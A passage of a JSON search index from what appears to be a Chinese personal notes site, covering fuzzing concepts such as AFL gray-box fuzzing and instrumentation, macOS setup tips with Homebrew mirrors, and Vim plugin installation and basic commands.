Fuzz\uff0c\u76f4\u63a5\u751f\u6210\u6837\u672c\u7684\u65b9\u5f0f\u8986\u76d6\u7387\u4f1a\u66f4\u9ad8\u3002\u4f46\u662f\u76f8\u5bf9\u7684\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e5f\u9700\u8981\u66f4\u591a\u7684\u79cd\u5b50\u6837\u672c\uff0c\u5bf9\u6837\u672c\u7684\u4f9d\u8d56\u6027\u4e5f\u66f4\u5f3a\u3002</li> <li>Hybrid Fuzz\uff1a\u8003\u8651\u5230 Genertion-Based \u548c Mutation-Based \u7684\u4f18\u7f3a\u70b9\uff0c\u90a3\u4e48\u53e6\u4e00\u79cd\u65b9\u5f0f\u5c31\u662f\u7ed3\u5408\u4e24\u79cd\u6a21\u5f0f\u5171\u540c\u8fdb\u884c Fuzz\uff0c\u751f\u6210\u968f\u673a\u6837\u672c\u4e4b\u540e\u518d\u8fdb\u884c\u76f8\u5e94\u7684\u53d8\u6362\uff0c\u4ee5\u83b7\u5f97\u66f4\u597d\u7684 Fuzz \u6548\u7387\u3002</li> </ul> <p>\u63d2\u6869</p> <p>\u63d2\u6869\u6280\u672f\u6307\u5728\u4fdd\u8bc1\u539f\u6709\u7a0b\u5e8f\u903b\u8f91\u5b8c\u6574\u6027\u7684\u57fa\u7840\u4e0a\uff0c\u5728\u7a0b\u5e8f\u4e2d\u63d2\u5165\u63a2\u9488\uff0c\u901a\u8fc7\u63a2\u9488\u91c7\u96c6\u4ee3\u7801\u4e2d\u7684\u4fe1\u606f\uff08\u65b9\u6cd5\u672c\u8eab\u3001\u65b9\u6cd5\u53c2\u6570\u503c\u3001\u8fd4\u56de\u503c\u7b49\uff09\u5728\u7279\u5b9a\u7684\u4f4d\u7f6e\u63d2\u5165\u4ee3\u7801\u6bb5\uff0c\u4ece\u800c\u6536\u96c6\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u52a8\u6001\u4e0a\u4e0b\u6587\u4fe1\u606f\u3002</p> <p>\u5728 AFL \u4e2d\uff0c\u901a\u8fc7\u63d2\u6869\uff0c\u53ef\u4ee5\u83b7\u77e5\u88ab\u6d4b\u7a0b\u5e8f\u7684\u8fd0\u884c\u4fe1\u606f\uff08\u8fd0\u884c\u5230\u90a3\u4e2a\u8def\u5f84\uff09\uff0c\u7528\u6765\u6307\u5bfc\u79cd\u5b50\u7684\u53d8\u5f02\u63d0\u9ad8\u6a21\u7cca\u6d4b\u8bd5\u7684\u6548\u7387\u3002</p> <p>\u7070\u76d2 Fuzzing</p> <p>\u7070\u76d2 Fuzzing \u7684\u6d41\u7a0b\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>\u5728\u9ed1\u76d2 Fuzzing \u7684\u57fa\u7840\u4e0a\u505a\u4e86\u5982\u4e0b\u6539\u6b63\uff1a</p> <ul> <li> <p>\u4e0d\u662f\u76f4\u63a5\u751f\u6210\u6d4b\u8bd5\u6837\u4f8b\uff0c\u800c\u662f\u901a\u8fc7\u521d\u59cb\u5316\u79cd\u5b50\u3002</p> </li> <li> <p>\u5982\u679c\u8be5\u79cd\u5b50\u53d8\u5f02\u751f\u6210\u7684\u6d4b\u8bd5\u6837\u4f8b\u4ea7\u751f\u4e86\u65b0\u7684<code>Path</code>\uff0c\u5c31\u8ba4\u4e3a\u8be5\u79cd\u5b50\u662f\u4e00\u4e2a\u597d\u79cd\u5b50\uff0c\u5c06\u5176\u518d\u6b21\u52a0\u5165<code>Seed Queue</code>\u4e2d\u3002\u8be5\u601d\u8def\u5c31\u662f \u9057\u4f20\u7b97\u6cd5 \u7684\u601d\u8def\u3002\u5176\u4e2d\u7684<code>Path</code>\u6307\u7684\u662f\u8fb9\u8986\u76d6\u7387\u4e2d\u7684\u65b0\u8def\u5f84\u3002</p> </li> </ul> <p>\u4e0a\u8ff0\u65b9\u6cd5\u662f\u901a\u8fc7\u8986\u76d6\u7387\u7684\u5bfc\u5411\u6027\u7b56\u7565\uff0c\u662f AFL \u4e2d\u4f7f\u7528\u7684\u5bfc\u5411\u7b56\u7565\uff0c\u968f\u7740\u673a\u5668\u5b66\u4e60\u7684\u53d1\u5c55\uff0c\u9010\u6e10\u5f15\u5165\u4e86\u5176\u4ed6\u7684\u8986\u76d6\u7387\u5bfc\u5411\u65b9\u6cd5\uff1a\u57fa\u4e8e\u968f\u673a\u4e0b\u964d\u7b97\u6cd5\u7684\u8986\u76d6\u7387\u5bfc\u5411\u65b9\u5f0f\u3001\u57fa\u4e8e\u8fdb\u5316\u7b97\u6cd5\u7684\u8986\u76d6\u7387\u5bfc\u5411\u65b9\u5f0f\u7b49\u6765\u5b9e\u73b0\u66f4\u9ad8\u6548\u7684\u5bfc\u5411\u3002</p> <p>\u5176\u4ed6\u8986\u76d6\u7387\u7b56\u7565\u5982\uff1aPatch Based</p> <p>\u603b\u7ed3</p> <p>\u5728\u7070\u76d2 Fuzzing \u4e2d\uff0c\u5b66\u754c\u4e3b\u8981\u7814\u7a76\u5982\u4e0b\u56db\u4e2a\u65b9\u9762\u7684\u95ee\u9898\uff1a</p> <ul> <li>Seed Selection Strategy\uff1a\u79cd\u5b50\u9009\u62e9\u7b56\u7565</li> <li>Seed Mutation Strategy\uff1a\u79cd\u5b50\u53d8\u5f02\u7b56\u7565</li> <li>Coverage Metrics\uff1a</li> <li>Program Under Test\uff1aafl \u4e3b\u8981\u7528\u4e8e c\uff0c\u540e\u7eed\u7684\u7814\u7a76\u5c06\u5176\u6269\u5c55\u5230\u4e86\u5176\u4ed6\u8f6f\u4ef6\uff0c\u5982 java\u3001linux kernel\u3002</li> </ul> <p>Reference</p> <ul> <li>Fuzz \u65b9\u6cd5</li> <li>\u6f0f\u6d1e\u4ee5\u53ca\u8f6f\u4ef6\u5b89\u5168\u5206\u6790\u6280\u672f\u8bb2\u89e3</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#todo","title":"TODO","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_13","title":"\u6a21\u578b\u68c0\u6d4b","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_14","title":"\u57fa\u4e8e\u6a21\u5f0f\u7684\u6f0f\u6d1e\u5206\u6790","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_15","title":"\u4e8c\u8fdb\u5236\u4ee3\u7801\u5206\u6790","text":""},{"location":"tools/","title":"Tool","text":"<p>Abstract</p> <p>\u672c\u7ae0\u8282\u8bb0\u5f55\u5e38\u7528\u5f00\u53d1\u5de5\u5177\u7684\u7b14\u8bb0\u3002</p>"},{"location":"tools/mac/","title":"Cook Mac","text":""},{"location":"tools/mac/#_1","title":"\u4e00\u3001\u5fc5\u5907\u8bbe\u7f6e","text":""},{"location":"tools/mac/#11-os-x","title":"1.1 \u66f4\u6539 OS X \u622a\u56fe\u9ed8\u8ba4\u4fdd\u5b58\u8def\u5f84","text":"<p>MAC <code>Command Shift 3</code> \u622a\u56fe\u65f6\uff0c\u5b58\u653e\u5728 <code>~/Desktop</code> \uff0c\u4f1a\u5f88\u4e71\uff0c\u5c06\u5176\u653e\u5230 <code>~/Downloads/Cache/screenshots</code> \u3002</p> <pre><code># open ITerm2, run\uff1a\ndefaults write com.apple.screencapture location ~/Downloads/Cache/screenshots\nkillall SystemUIServer\n</code></pre> <p>\u63a8\u8350\u5c06 Snipaste \u7684\u9ed8\u8ba4\u8def\u5f84\u4e5f\u4fee\u6539\u4e3a\u6b64\u5904</p>"},{"location":"tools/mac/#12","title":"1.2 \u5173\u95ed\u7ffb\u76d6\u81ea\u52a8\u5f00\u673a","text":"<pre><code>sudo nvram AutoBoot=%0   # \u5173\u95ed\nsudo nvram AutoBoot=%03  # \u5f00\u542f\n</code></pre>"},{"location":"tools/mac/#13-xcode","title":"1.3 \u5b89\u88c5 Xcode \u547d\u4ee4\u884c\u5de5\u5177","text":"<pre><code>xcode-select --install\n</code></pre>"},{"location":"tools/mac/#14-mac","title":"1.4 \u5173\u95ed Mac \u5f00\u673a\u58f0\u97f3","text":"<p>\u7cfb\u7edf\u8bbe\u7f6e -&gt; \u58f0\u97f3 -&gt; \u542f\u52a8\u65f6\u64ad\u653e\u58f0\u97f3\uff0c\u82e5\u65e0\u6cd5\u8bbe\u7f6e\uff0c\u5219\u8f93\u5165\u547d\u4ee4\uff1a</p> <pre><code>sudo nvram SystemAudioVolume=%80\n</code></pre>"},{"location":"tools/mac/#_2","title":"\u4e8c\u3001\u6587\u4ef6\u7ba1\u7406","text":"<p>\u91cd\u8981\u7684\u6587\u6863\u548c\u7b14\u8bb0\u5747\u4f7f\u7528 OneDrive \u4e09\u7aef\u540c\u6b65</p> <pre><code>/OneDrive      # \u4e91\u540c\u6b65\u76d8\uff0c\u91cd\u8981\u4fe1\u606f\u5b58\u653e\u5904\n/Documents     # \u5e94\u7528\u6240\u5b58\u50a8\u7684\u5185\u5bb9\u90fd\u653e\u5728\u8fd9\uff0c\u6bd4\u5982zotero\u3001MarginNote\u3001OneDrive\u7b49\n/Projects      # \u9879\u76ee\n\n/Downloads     # \u4e0b\u8f7d \u5b58\u50a8\u4e0b\u8f7d\u7684\u6587\u4ef6\uff0c\u5206\u7c7b\u653e\u597d\n    /Cache       # \u4e34\u65f6\u4f7f\u7528\uff0c\u53ef\u968f\u65f6\u5220\u9664\n        /screenshots\n    /Package\n        /Plugin\n\n/Applications  # \u5e94\u7528\n/Movies        # \u5f71\u89c6\n/Music         # \u97f3\u4e50\n/Picture       # \u56fe\u7247\n/Desktop       # \u684c\u9762\uff0c\u4e0d\u4f7f\u7528\uff01\n/Library       # \u65e0\u9700\u4fee\u6539\n/Public        # \u65e0\u9700\u4fee\u6539\n</code></pre>"},{"location":"tools/mac/#_3","title":"\u4e09\u3001\u8f6f\u4ef6\u63a8\u8350\u53ca\u914d\u7f6e","text":"<p>\u514d\u8d39</p> <ul> <li>AltTab\uff1aGithub\uff0ccmd tab \u589e\u5f3a\uff0c\u5fc5\u5907\u795e\u5668\uff01</li> <li>ClashX\uff1aGithub\uff0c\u4ee3\u7406\u3002</li> <li>PicGo\uff1aGithub\uff0c\u56fe\u5e8a\u3002</li> <li>Iterm2\uff1a\u5b98\u7f51\uff0cshell\u3002</li> <li>snipaste\uff1a\u5b98\u7f51\uff0c\u622a\u56fe\u3001\u8d34\u56fe\u3001\u5f55\u5236\u5c4f\u5e55\uff0c\u5f3a\u70c8\u63a8\u8350\uff01\u3002\u540c\u7c7b\u63a8\u8350\uff1aiShot</li> <li>JetBrains Toolbox\uff1a\u5b98\u7f51\uff0cIDE \u7ba1\u7406\u5668\u3002</li> <li>Tencent Lemon\uff1a\u5b98\u7f51\uff0c\u78c1\u76d8\u7a7a\u95f4\u6e05\u7406</li> <li>\u6ef4\u7b54\u6e05\u5355\uff1a\u5b98\u7f51\uff0c\u78c1\u76d8\u7a7a\u95f4\u6e05\u7406</li> <li>Switch Key\uff1a\u5b98\u7f51\uff0c\u8f93\u5165\u6cd5\u9501\u5b9a\uff0c\u5f3a\u70c8\u63a8\u8350\uff01</li> <li>keka\uff1a\u5b98\u7f51\uff0c\u89e3\u538b\uff0c\u5f3a\u70c8\u63a8\u8350\uff01</li> <li>oss browser\uff1a\u5b98\u7f51\uff0c\u963f\u91cc\u4e91 oss \u6d4f\u89c8\u5668</li> <li>Hidden Bar\uff1aApple Store\uff0c\u5b9a\u5236\u83dc\u5355\u680f\uff0c\u4e0d\u518d\u66f4\u65b0\u3002</li> <li>iBar\uff1aApple Store\uff0c\u5b9a\u5236\u83dc\u5355\u680f\uff0c\u65b0\u7248\u672c Mac \u5f3a\u70c8\u63a8\u8350\uff01</li> <li>Bob\uff1aApple Store\uff0c\u7ffb\u8bd1\uff0c\u5f3a\u70c8\u63a8\u8350\uff01</li> <li>Qmenu\uff1aApple Store\uff0c\u8bbf\u8fbe\u53f3\u952e\u589e\u5f3a\uff0c\u5f3a\u70c8\u63a8\u8350\uff01</li> <li>windowizard\uff1a\u5b98\u7f51\uff0c\u7a97\u53e3\u7ba1\u7406\uff0c\u5f3a\u70c8\u63a8\u8350\uff01</li> </ul> <p>\u4f53\u9a8c\u4e00\u822c\uff0c\u4f46\u4f60\u53ef\u80fd\u9700\u8981</p> <ul> <li>\u77e5\u4e91\u6587\u732e\u7ffb\u8bd1</li> <li>Notion</li> </ul> <p>\u6536\u8d39</p> <ul> <li>Alfred\uff1a\u5b98\u7f51\u3002\u552f\u4e00\u771f\u795e\u3002\u540c\u7c7b\u63a8\u8350\uff1ahapigo</li> <li>Magnet\uff1aApple Store\uff0c\u5206\u5c4f\u8f6f\u4ef6\u3002\u540c\u7c7b\u63a8\u8350\uff1awindowizard</li> <li>Popclip\uff1a\u5b98\u7f51\uff0c\u5212\u8bcd\u589e\u5f3a\uff08\u914d\u5408\u63d2\u4ef6\uff0c\u5982 Bob\u3001Alfred\u3001Dash \u7b49\uff09</li> <li>MarginNote3\uff1a\u5b98\u7f51\uff0c\u9605\u8bfb\u6587\u732e</li> <li>\u997a\u5b50\u7ffb\u8bd1\uff1a\u5b98\u65b9\uff0c\u5212\u8bcd\u7ffb\u8bd1\u3001\u622a\u56fe\u7ffb\u8bd1\u3001OCR</li> </ul> <p>\u5b58\u5728\u66ff\u4ee3\u54c1</p> <ul> <li>DaisyDisk\uff1a\u5b98\u7f51\uff0c\u78c1\u76d8\u7ba1\u7406\u3002 \u514d\u8d39\u66ff\u4ee3\u54c1\uff1aTencent Lemon</li> <li>Bartender 4\u3001istat menus\uff1a\u6536\u8d39\uff0c\u5b98\u7f51\uff0c\u5b9a\u5236\u83dc\u5355\u680f\u3002\u514d\u8d39\u66ff\u4ee3\u54c1\uff1aHidden Bar</li> <li>New File Menu\uff1a\u5b98\u7f51\uff0c\u8bbf\u8fbe\u6269\u5c55\u3002\u4ed8\u8d39\u66ff\u4ee3\u54c1\uff1aQmenu\uff0c\u529f\u80fd\u66f4\u5f3a\u5927</li> </ul>"},{"location":"tools/mac/#31-iterm2","title":"3.1 ITerm2","text":""},{"location":"tools/mac/#311","title":"3.1.1 \u4ee3\u7406","text":"<p>\u4ee5 ClashX \u4e3a\u4f8b\uff1a\u70b9\u51fb ClashX\uff0c\u590d\u5236\u7ec8\u7aef\u4ee3\u7406\u547d\u4ee4</p> <pre><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\n</code></pre> <ul> <li>\u4e34\u65f6\u4fee\u6539\uff1a\u5c06\u4e0a\u8ff0\u547d\u4ee4\u8fd0\u884c\u5373\u53ef</li> <li>\u6c38\u4e45\u4fee\u6539\uff1a\u5c06\u5176\u5199\u5165\u914d\u7f6e\u6587\u4ef6<code>~/.zshrc</code>\u4e2d</li> </ul>"},{"location":"tools/mac/#312-shell","title":"3.1.2 shell \u7f8e\u5316","text":"<p>Linux Initialize Shell And Plugins</p>"},{"location":"tools/mac/#32-alfred","title":"3.2 Alfred","text":""},{"location":"tools/mac/#321","title":"3.2.1 \u540c\u6b65\u6570\u636e","text":"<p>Advanced -&gt; \u540c\u6b65 -&gt; iCloud/alfred</p>"},{"location":"tools/mac/#322-iterm","title":"3.2.2 <code>&gt;</code>\u9ed8\u8ba4\u6253\u5f00 ITerm","text":"<p>\u2460 \u8fd0\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u83b7\u53d6\u811a\u672c</p> <pre><code>curl --silent 'https://raw.githubusercontent.com/vitorgalvao/custom-alfred-iterm-scripts/master/custom_iterm_script.applescript' | pbcopy\n</code></pre> <p>\u2461 Alfred Preferences -&gt; Features -&gt; Terminal</p> <p>\u2462 \u7c98\u8d34\u811a\u672c</p>"},{"location":"tools/mac/#323-workflow","title":"3.2.3 workflow","text":"<ul> <li>Dash\uff1a\u76f4\u63a5\u4e0b\u8f7d Dash \u8f6f\u4ef6\uff0c\u8fdb\u5165 Intergration\u3002</li> <li>GitHub\uff1a\u5b98\u7f51</li> <li>LastPass CLI\uff1a\u5b98\u7f51</li> <li>Kill Process\uff1aGithub</li> <li>Ip address\uff1aGithub</li> <li>Youdao Translate\uff1aGithub</li> </ul>"},{"location":"tools/mac/#324-search-from-cloud","title":"3.2.4 search from cloud","text":"<p>preferences -&gt; Features -&gt; Fefaults Results -&gt; Search Type -&gt; <code>add cloud path</code></p>"},{"location":"tools/mac/#33-homebrew","title":"3.3 Homebrew","text":"<p>\u6587\u4ef6\u5b89\u88c5\u4f4d\u7f6e\uff1a</p> <ul> <li>m1(ARM)\uff1a/opt</li> <li>X86\uff1a/usr/local</li> </ul> <p>\u6362\u4e2d\u79d1\u5927\u6e90\uff1a</p> <pre><code># Homebrew\u6e90\necho 'export HOMEBREW_BREW_GIT_REMOTE=\"https://mirrors.ustc.edu.cn/brew.git\"' &gt;&gt; ~/.zshrc\n# cask\u6e90\nbrew tap --custom-remote --force-auto-update homebrew/cask https://mirrors.ustc.edu.cn/homebrew-cask.git\n# core\u6e90\necho 'export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.ustc.edu.cn/homebrew-core.git\"' &gt;&gt; ~/.zshrc\n# bottles\u6e90\necho 'export HOMEBREW_BOTTLE_DOMAIN=\"https://mirrors.ustc.edu.cn/homebrew-bottles\"' &gt;&gt; ~/.zshrc\n\nbrew update\nbrew upgrade # wait a minute\n</code></pre>"},{"location":"tools/mac/#34-notion","title":"3.4 Notion","text":"<p>\u4e3b\u8981\u4ecb\u7ecd\u5982\u4f55\u5728 Notion \u4e2d\u5d4c\u5165\u6d41\u7a0b\u56fe</p> <ul> <li> <p>Diagrams\uff1a\u6559\u7a0b</p> </li> <li> <p>File-Embed-Notion</p> <p></p> </li> <li> <p>Edit\uff1aCustom\uff08\u4e0d\u8981\u9009 make a copy\uff09</p> </li> <li>Check\uff1a\u9700\u8981\u4e3a public\uff0c\u5426\u5219\u9700\u8981\u767b\u5f55\uff08\u7f51\u9875\u7248\u767b\u5f55\u540e\u53ef\u6b63\u5e38\u67e5\u770b\uff0c\u684c\u9762\u7248\u65e0\u6cd5\u767b\u9646\uff09</li> <li> <p>\u4f7f\u7528\uff1anotion \u4e2d\u8f93\u5165<code>/embed</code>\uff0c\u5c06\u94fe\u63a5\u590d\u5236\u8fdb\u53bb\u5373\u53ef\u3002</p> </li> <li> <p>whimsical</p> </li> </ul>"},{"location":"tools/mac/#35-popclip","title":"3.5 popclip","text":"<p>Download From PopClip Extensions\uff1a</p> <ul> <li>Terminal</li> <li>Google Search</li> <li>Google Scholar</li> <li>Bob</li> <li>Alfred</li> <li>DeepL Translator</li> <li>Join Lines</li> <li>Remove Spaces</li> <li>Paste And Match</li> <li>Run Command</li> </ul>"},{"location":"tools/mac/#36","title":"3.6 \u7ffb\u8bd1","text":"<ul> <li>Alfred\uff1a\u6709\u9053\u7ffb\u8bd1\u5de5\u4f5c\u6d41</li> <li>\u6d4f\u89c8\u5668\u6c99\u62c9\u67e5\u8bcd\uff1a\u6709\u9053\u7ffb\u8bd1</li> <li>Bob \u5b89\u88c5 DeepL Plugin\uff0c\u963f\u91cc\u7ffb\u8bd1 + DeepL</li> <li>\u997a\u5b50\u7ffb\u8bd1\uff1a\u706b\u5c71\u7ffb\u8bd1</li> </ul> <p>API \u83b7\u53d6</p> <ul> <li>\u6709\u9053\u7ffb\u8bd1</li> <li>DeepL \u7ffb\u8bd1</li> <li>\u706b\u5c71\u7ffb\u8bd1</li> <li>\u963f\u91cc\u7ffb\u8bd1</li> </ul>"},{"location":"tools/mac/#_4","title":"\u56db\u3001\u73af\u5883\u53d8\u91cf","text":"<p>Mac \u4e2d\u73af\u5883\u53d8\u91cf\u7684\u52a0\u8f7d\u987a\u5e8f\u5982\u4e0b\uff1a</p> <pre><code>/etc/profile\n/etc/paths\n\n~/.bash_profile\n~/.bash_login\n~/.profile\n\n~/.bashrc\n</code></pre> <p>\u7cfb\u7edf\u7ea7\u522b\uff1a</p> <ul> <li><code>/etc/profile</code>\uff1a\u5168\u5c40\u914d\u7f6e\uff0c\u4e0d\u7ba1\u54ea\u4e2a\u7528\u6237\uff0c\u767b\u5f55\u65f6\u90fd\u4f1a\u8bfb\u53d6\u8be5\u6587\u4ef6\u3002\u4e0d\u5efa\u8bae\u4fee\u6539\u3002</li> <li><code>/etc/paths</code>\uff1a\u5c06\u5168\u5c40\u73af\u5883\u53d8\u91cf\u6dfb\u52a0\u5230 paths \u6587\u4ef6\u4e2d\u3002</li> </ul> <p>\u7528\u6237\u7ea7\u522b\uff1a</p> <ul> <li><code>~/.bash_profile</code>\uff1a\u5f53\u8be5\u6587\u4ef6\u5b58\u5728\u65f6\uff0c<code>~/.bash_login</code>\u548c<code>.profile</code>\u4f1a\u81ea\u52a8\u5931\u6548\uff0c\u5373\u4fbf\u5176\u4e2d\u5b58\u5728\u7740\u914d\u7f6e\u3002</li> </ul> <p>Note</p> <p>\u6ce8\u610f\uff0c\u5982\u679c\u4f60\u4f7f\u7528 zsh\uff0c\u90a3\u4e48\u9700\u8981\u5728 <code>~/.zshrc</code> \u4e2d\u6dfb\u52a0\uff1a<code>source ~/.bash_profile</code>\uff0c\u5982\u679c\u4f7f\u7528 bash\uff0c\u5219\u65e0\u9700\u64cd\u4f5c\uff0c\u4f1a\u81ea\u52a8\u751f\u6548\uff01</p> <p>\u539f\u56e0\uff1a<code>/etc/bashrc</code>\u6587\u4ef6\u4e2d\u5e94\u8be5\u8bbe\u7f6e\u4e86\u5bfc\u5165<code>.bash_profile</code>\u914d\u7f6e\u7684\u64cd\u4f5c\uff0c\u4f46\u662f<code>/etc/zshrc</code>\u4e2d\u6ca1\u6709\u3002</p> <ul> <li> <p><code>~/.bashrc</code> OR <code>~/.zshrc</code></p> </li> <li> <p>\u5982\u679c\u9ed8\u8ba4 shell \u662f bash\uff0c\u90a3\u4e48 shell \u542f\u52a8\u65f6\u4f1a\u89e6\u53d1<code>~/.bashrc</code></p> </li> <li>\u5982\u679c\u9ed8\u8ba4 shell \u662f zsh\uff0c\u90a3\u4e48 shell \u542f\u52a8\u65f6\u4f1a\u89e6\u53d1<code>~/.zshrc</code></li> </ul> <p>\u67e5\u770b\u9ed8\u8ba4 shell\uff1a<code>echo $SHELL</code></p> <p>\u751f\u6548\u65b9\u6cd5</p> <ul> <li>\u91cd\u542f\u751f\u6548</li> <li>\u4e0d\u91cd\u542f\u751f\u6548\uff1a<code>source ~/.zshrc</code></li> </ul> <p>PATH \u53d8\u91cf</p> <pre><code># \u8bed\u6cd5\nexport PATH=$PATH:&lt;PATH 1&gt;:&lt;PATH 2&gt;:...:&lt;PATH N&gt;\n\n# \u5b9e\u4f8b\nexport JAVA_HOME=/user/.../jdk/Home\nexport Go_HOME=/USER/local/go\nexport PATH=$PATH:$GO_HOME/bin:$JAVA_HOME/BIN\n\n# \u67e5\u770b\u73af\u5883\u53d8\u91cf\u7684\u503c\necho $\u53d8\u91cf\u540d\n</code></pre> <p>\u603b\u7ed3</p> <ul> <li>\u5168\u5c40\u7684\u53d8\u91cf\uff1a<code>~/.bash_profile</code></li> <li>shell \u8bbe\u7f6e\uff1a<code>~/.zshrc</code></li> </ul>"},{"location":"tools/mac/#references","title":"References","text":"<ul> <li> <p>MacOS \u73af\u5883\u53d8\u91cf\u52a0\u8f7d\u987a\u5e8f</p> </li> <li> <p>\u5c11\u6570\u6d3e | Mac \u57fa\u7840\u6559\u7a0b\uff1a\u5982\u4f55\u66f4\u6539 OS X \u622a\u56fe\u9ed8\u8ba4\u4fdd\u5b58\u8def\u5f84</p> </li> <li>Github-Custom-alfred-iterm-scripts</li> </ul>"},{"location":"tools/vim/","title":"Vim \u53ca\u5176\u63d2\u4ef6\u548c\u5165\u95e8","text":""},{"location":"tools/vim/#install","title":"Install","text":"<p>\u4e24\u7c7b\u5f00\u7bb1\u5373\u7528\u7684 vim \u63d2\u4ef6\u7ba1\u7406\u5de5\u5177</p> <ul> <li> <p>vimrc\uff1a\u63a8\u8350</p> </li> <li> <p>vimplus</p> </li> </ul> <p>vimrc</p> \u5b89\u88c5 vimrc<pre><code>git clone --depth=1 https://github.com/amix/vimrc.git ~/.vim_runtime\ngit clone --depth=1 https://gitee.com/forkhub-tsing/vimrc.git ~/.vim_runtime\n\nsh ~/.vim_runtime/install_awesome_vimrc.sh\n</code></pre> <p>Vimplus</p> \u5b89\u88c5 vimplus<pre><code>git clone https://github.com/chxuan/vimplus.git ~/.vimplus\ngit clone https://gitee.com/forkhub-tsing/vimplus.git ~/.vimplus\n\ncd ~/.vimplus\n./install.sh\n</code></pre> \u67e5\u770b vim \u63d2\u4ef6<pre><code>vim ~/.vimrc\n# \u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u5185\u5bb9\uff0c\u4e24\u4e2acall\u4e2d\u95f4\u7684\u5185\u5bb9\u5c31\u662f\u6211\u4eec\u7684\u63d2\u4ef6\ncall plug#begin()\nPlug 'preservim/NERDTree'\ncall plug#end()\n</code></pre> \u8be5 vimplus \u63d2\u4ef6\u9ed8\u8ba4\u5b89\u88c5\u4e86\u82e5\u5e72\u63d2\u4ef6\uff0c\u5982\u679c\u5b89\u88c5\u5931\u8d25\uff1a<pre><code># \u8fdb\u5165vim\u6587\u672c\u7f16\u8f91\u5668\nvim\n\n# \u5b89\u88c5\u6240\u6709\u63d2\u4ef6\n:PlugInstall\n\n# \u66f4\u65b0\u63d2\u4ef6\n:PlugUpdate\n\n# \u5982\u679c\u4f60\u4e0d\u60f3\u66f4\u65b0\u6240\u6709\u7684\u63d2\u4ef6\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0\u63d2\u4ef6\u7684\u540d\u5b57\u6765\u66f4\u65b0\u4efb\u4f55\u63d2\u4ef6:\n:PlugUpdate NERDTree\n</code></pre>"},{"location":"tools/vim/#usage","title":"Usage","text":"<p>vim \u81ea\u5e26\u6559\u7a0b\uff0c\u547d\u4ee4\u884c\u8f93\u5165\uff1avimtutor</p> <p>\u64cd\u4f5c\u7b26\uff1a</p> <ul> <li>d\uff1a\u5220\u9664</li> <li>c\uff1a\u66f4\u6539\uff0c\u5220\u9664+\u63d2\u5165</li> <li>y\uff1a\u590d\u5236</li> </ul> <p>\u4e00\u4e2a\u7b80\u77ed\u7684\u52a8\u4f5c\u5217\u8868\uff1a</p> <ul> <li>w - \u4ece\u5f53\u524d\u5149\u6807\u5f53\u524d\u4f4d\u7f6e\u76f4\u5230\u4e0b\u4e00\u4e2a\u5355\u8bcd\u8d77\u59cb\u5904\uff0c\u8df3\u8fc7\u6240\u6709\u7a7a\u683c\u3002</li> <li>e - \u4ece\u5f53\u524d\u5149\u6807\u5f53\u524d\u4f4d\u7f6e\u76f4\u5230\u4e0b\u4e00\u4e2a\u6709\u6548\u5355\u8bcd\u672b\u5c3e\uff0c\u4e0d\u5305\u62ec\u7a7a\u683c\u3002</li> <li>$ - \u4ece\u5f53\u524d\u5149\u6807\u5f53\u524d\u4f4d\u7f6e\u76f4\u5230\u5f53\u524d\u884c\u672b\u3002</li> </ul> <p>\u5220\u9664\u7c98\u8d34\uff1a</p> <ul> <li> <p>u \u64a4\u9500\u4e00\u6b21\uff0cU \u6062\u590d\u5230\u521d\u59cb\u72b6\u6001</p> </li> <li> <p>ctrl-R\uff1aredo\uff0c\u53d6\u6d88\u64a4\u9500 dd</p> </li> <li> <p>dd \u5220\u9664\u4e00\u884c\u540e\uff0c\u5149\u6807\u79fb\u52a8\u5230\u51c6\u5907**\u7f6e\u5165\u7684\u4f4d\u7f6e\u7684\u4e0a\u65b9**\uff0c\u4f7f\u7528 p \u7c98\u8d34</p> </li> </ul> <p>\u63d2\u5165\u547d\u4ee4\uff1a</p> <ul> <li>i\uff0c\u5149\u6807\u524d\u65b9\u63d2\u5165</li> <li>a\uff0c\u5149\u6807\u540e\u65b9\u63d2\u5165</li> <li>o\uff0c\u5149\u6807\u4e0a\u65b0\u5f00\u4e00\u884c</li> <li>O\uff0c\u5149\u6807\u4e0b\u65b0\u5f00\u4e00\u884c</li> <li>cw/ce\uff0c\u6216\u8005 c$\u7b49\u64cd\u4f5c\uff0c\u90fd\u53ef\u4ee5\u5728\u5220\u9664\u4e00\u5b9a\u7684\u4e1c\u897f\u540e\u8fdb\u5165\u63d2\u5165\u72b6\u6001</li> </ul> <p>\u66ff\u6362\u547d\u4ee4\uff1a\u66ff\u6362\u5b8c\u6bd5\u540e\u4f1a\u81ea\u52a8\u56de\u5230 normal \u72b6\u6001</p> <ul> <li>r\uff0c\u5149\u6807\u5904\u66ff\u6362\u4e00\u4e2a\u5b57\u7b26</li> <li>R\uff0c\u5149\u6807\u5904\u5f00\u59cb\u66ff\u6362\uff0c\u6309 esc \u9000\u51fa\u66ff\u6362</li> </ul> <p>\u641c\u7d22\u547d\u4ee4</p> <ul> <li>/\uff0c\u6b63\u5e8f\u67e5\u8be2\uff0cn \u4e0b\u4e00\u4e2a\uff0cN \u4e0a\u4e00\u4e2a</li> <li>?\uff0c\u5012\u53d9\u67e5\u8be2</li> <li>\u67e5\u8be2\u65f6\u5ffd\u7565\u5927\u5c0f\u5199\uff1a<code>:set ic</code>\uff0cignore 